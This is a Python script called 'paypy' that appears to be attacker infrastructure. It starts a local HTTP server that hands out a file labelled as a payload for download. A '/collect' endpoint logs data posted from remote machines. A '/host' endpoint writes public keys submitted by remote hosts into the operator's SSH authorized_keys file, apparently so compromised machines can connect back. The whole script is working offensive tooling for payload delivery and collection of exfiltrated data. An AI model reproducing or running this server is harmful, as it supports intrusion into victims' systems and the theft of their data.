#!/usr/bin/env python3
from http.server import SimpleHTTPRequestHandler, HTTPServer
from socket import socket, AF_INET, SOCK_DGRAM
from colorama import Fore, Style
from sys import exit, argv, stdout
from time import strftime
import os
import json

class DownloadHandler(SimpleHTTPRequestHandler):
	def end_headers(self):
		filename = self.base_path.split('/')[-1]
		self.send_header('Content-Disposition', f'attachment; filename="{filename}"')
		super().end_headers()

	def log_message(self, format, *args):
		if self.command == 'GET':
			client_ip = self.client_address[0]
			current_time = strftime('%Y-%m-%d %H:%M:%S')
			stdout.write(f'{Fore.RED}[paypy]{Style.RESET_ALL} {current_time} - {client_ip} - {format % args}\n')
			stdout.flush()

	def sanitize_key(self, key):
		key = key.replace('\r\n', '\n').strip()
		key = ''.join([char for char in key if ord(char) < 128])
		return key

	def do_POST(self):
		content_length = int(self.headers['Content-Length'])
		post_data = self.rfile.read(content_length)
		current_time = strftime('%Y-%m-%d %H:%M:%S')
		client_ip = self.client_address[0]
		if self.path == '/host':
			stdout.write(f'{Fore.RED}[host]{Style.RESET_ALL} {current_time} - {client_ip} - Host notification received:\n{post_data.decode()}\n')
			try:
				post_json = json.loads(post_data.decode())
				public_key = post_json.get("PublicKey", {}).get("value", "")
				if public_key:
					# Sanitize the public key to avoid issues with encoding
					public_key = self.sanitize_key(public_key)
					os.makedirs(os.path.expanduser("~/.ssh"), exist_ok=True)
					with open(os.path.expanduser("~/.ssh/authorized_keys"), "a") as auth_keys:
						auth_keys.write(public_key + "\n")
					stdout.write(f'{Fore.GREEN}[success]{Style.RESET_ALL} Public key added to authorized_keys\n')
				else:
					stdout.write(f'{Fore.YELLOW}[warning]{Style.RESET_ALL} No public key found in POST data\n')
			except json.JSONDecodeError:
				stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Failed to decode JSON from POST data\n')

		elif self.path == '/collect':
			stdout.write(f'{Fore.GREEN}[magicK]{Style.RESET_ALL} {current_time} - {client_ip} - Received magicK data:\n{post_data.decode()}\n')
		else:
			stdout.write(f'{Fore.YELLOW}[unknown]{Style.RESET_ALL} {current_time} - {client_ip} - Unknown POST request received:\n{post_data.decode()}\n')
		stdout.flush()
		self.send_response(200)
		self.end_headers()

def get_local_ip():
	s = socket(AF_INET, SOCK_DGRAM)
	s.connect(('8.8.8.8', 80))
	local_ip = s.getsockname()[0]
	s.close()
	return local_ip

if len(argv) != 3:
	print('usage: paypy <port> </payload/path>')
	exit(1)

port = int(argv[1])
file_path = argv[2]
DownloadHandler.base_path = file_path
local_ip = get_local_ip()
httpd = HTTPServer((local_ip, port), DownloadHandler)

print(f'{Fore.RED}[paypy]{Style.RESET_ALL} local server started: {local_ip}:{port}')
print(f'{Fore.RED}[paypy]{Style.RESET_ALL} downloadable payload: {file_path}')
stdout.flush()
httpd.serve_forever()
